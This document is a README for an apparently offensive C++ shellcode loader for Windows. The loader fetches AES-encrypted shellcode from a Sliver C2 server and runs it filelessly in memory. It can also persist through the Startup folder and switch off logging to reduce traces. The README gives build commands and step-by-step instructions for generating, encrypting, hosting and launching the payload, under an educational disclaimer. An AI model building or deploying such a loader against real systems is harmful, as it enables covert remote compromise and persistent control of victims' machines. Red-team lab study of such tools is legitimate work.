# sliverWrapper.cpp – Learning Tool / Red Teaming Lab

## Introduction

`sliverWrapper.cpp` is a **shellcode loader written in C++ for Windows** that supports downloading, decrypting, and executing shellcode **in memory** from a C2 server.  
It can be used with **shellcode from Sliver** or **any other staged shellcode** retrieved from a C2 in a lab environment.  
Additionally, the project provides utility functions to encrypt/decrypt files (AES-128-CBC), download files over HTTP(S), and an optional self-copy to the Startup folder for persistence.

---

## Build (MinGW/MSYS2)

Build as a **static** binary (to reduce runtime dependencies):

```sh
g++ sliverWrapper.cpp -o sliverWrapper.exe \
  -lwininet -lssl -lcrypto -lws2_32 -lcrypt32 \
  -static -static-libgcc -static-libstdc++
```

---

## Features

- Download encrypted shellcode from a C2 server over HTTP/HTTPS (proxy configurable).
- Decrypt with AES-128-CBC and execute shellcode in memory (fileless).
- Utility to encrypt/decrypt files for preparing payloads in a lab.
- Optional self-copy to the Startup folder to **test** persistence in a disposable VM.
- Ability to disable all logs/printf to reduce trace noise during experiments.

---

## Usage

This section shows how to use **Sliver C2** to generate shellcode:

1) **Generate shellcode from Sliver**  
   On the Sliver operator machine, create a stage (e.g., HTTP/HTTPS beacon):

   ```text
   generate --http http(s)://<YOUR_IP_OR_DOMAIN>:<YOUR_PORT> -N agent -s /tmp
   ```

   > The loader code defaults to ports **443** (HTTPS) and **80** (HTTP). Adjust if needed to match your lab infrastructure.

2) **Encrypt the shellcode for the lab**  
   - Use the helper function **`encryptFileToBin(...)`** in the source code to encrypt the shellcode file generated in step (1).
   - Ensure **key/iv are 16 bytes**. Output a binary file (e.g., `stage.enc`).

3) **Host the encrypted file over HTTP(S)**  
   - Quick way:  
     ```sh
     python -m http.server 8080
     ```
   - Or use Nginx/Apache. Note the **download URL** (e.g., `http://<HOST>:8080/stage.enc`).

4) **Start the Sliver listener**  
   In Sliver, set up the C2 listener:
   ```text
   http -L <YOUR_IP> -l <YOUR_PORT>
   ```

5) **Run the loader**  
   - Update the **download URL** and **key/IV** in the source configuration (if hardcoding for the lab) or via your parameter mechanism.
   - Rebuild (see _Build_). Run `sliverWrapper.exe` inside your **lab VM**.

---

## Disclaimer

> **For educational and lawful research purposes only.**
>
> - Only run in a personal lab environment or on systems where you have authorization.
> - Do not use in production or on systems outside your control.
> - The author is not responsible for any misuse or legal violations.
